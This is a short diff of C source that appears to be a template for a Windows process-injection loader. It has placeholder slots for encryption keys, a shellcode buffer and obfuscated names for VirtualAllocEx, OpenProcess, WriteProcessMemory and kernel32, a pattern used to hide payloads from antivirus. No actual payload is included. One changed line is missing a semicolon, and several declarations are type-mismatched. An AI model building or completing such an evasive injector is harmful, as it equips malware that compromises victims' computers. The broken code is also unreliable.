@@ -54,15 +54,15 @@ void doShit() {
 	BOOL(WINAPI * WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
 	BOOL(WINAPI * CloseHandle)(HANDLE);
 
-	unsigned char key = "place_key";
-	unsigned char key2 = "place_key2";
-	int shift = "place_shift";
+	unsigned char key = place_key;
+	unsigned char key2 = place_2key;
+	int shift = place_shift;
 	unsigned char shellcode[] = "place_shellcode";
-	unsigned char vallocx_key[] = "place_vallocx_key";
+	unsigned char vallocx_key[] = "place_k_vallocx"
 	unsigned char open_proc_key[] = "place_open_proc_key";
 	unsigned char write_proc_key[] = "place_write_proc_key";
 	unsigned char close_handle_key[] = "place_close_handle_key";
-	unsigned char kernel32_key[] = "place_kernel32_key";
+	unsigned char kernel32_key[] = "place_k_kernel32";
 	unsigned char vallocex[] = "place_vallocex";
 	unsigned char openPRC[] = "place_openPRC";
 	unsigned char writePRC[] = "place_writePRC";
